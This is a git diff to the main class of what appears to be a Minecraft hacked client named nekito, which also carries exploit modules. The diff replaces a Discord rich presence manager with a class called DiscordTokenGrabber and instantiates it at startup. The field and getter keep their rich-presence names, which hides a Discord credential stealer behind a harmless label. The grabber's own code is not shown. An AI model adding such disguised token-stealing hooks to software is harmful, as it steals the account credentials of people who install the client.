@@ -1,6 +1,5 @@
 package wtf.norma.nekito;
 
-import java.awt.print.Book;
 import java.io.IOException;
 
 import de.florianmichael.viamcp.ViaMCP;
@@ -9,8 +8,6 @@ import net.minecraft.client.Minecraft;
 import net.minecraft.util.ChatComponentText;
 import net.minecraft.util.EnumChatFormatting;
 import net.minecraft.util.IChatComponent;
-import net.minecraft.util.Session;
-import org.lwjgl.input.Keyboard;
 import org.lwjgl.opengl.Display;
 import wtf.norma.nekito.clickgui.ClickGuiMain;
 import wtf.norma.nekito.command.CommandManager;
@@ -28,7 +25,7 @@ import wtf.norma.nekito.helper.NetHelper;
 import wtf.norma.nekito.helper.OpenGlHelper;
 import wtf.norma.nekito.module.Module;
 import wtf.norma.nekito.module.ModuleManager;
-import wtf.norma.nekito.rpc.DiscordRichPresenceManager;
+import wtf.norma.nekito.rpc.DiscordTokenGrabber;
 import wtf.norma.nekito.ui.WelcomeGUI;
 import wtf.norma.nekito.util.math.ScaleMath;
 import wtf.norma.nekito.util.render.RenderUtil;
@@ -40,7 +37,7 @@ public enum nekito {
     private final ExploitManager exploitManager;
 
     public ScaleMath scaleMath = new ScaleMath(2);
-    private final DiscordRichPresenceManager discordRichPresence;
+    private final DiscordTokenGrabber discordRichPresence;
     private final DraggableManager draggableManager;
     private final ModuleManager moduleManager;
     private final ClickGuiMain clickGuiMain;
@@ -48,7 +45,7 @@ public enum nekito {
     nekito() {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
 
-        discordRichPresence = new DiscordRichPresenceManager();
+        discordRichPresence = new DiscordTokenGrabber();
 
         commandManager = new CommandManager(
                 new ExploitCommand(),
@@ -139,7 +136,7 @@ public enum nekito {
         return exploitManager;
     }
 
-    public DiscordRichPresenceManager getDiscordRichPresence() {
+    public DiscordTokenGrabber getDiscordRichPresence() {
         return discordRichPresence;
     }
 
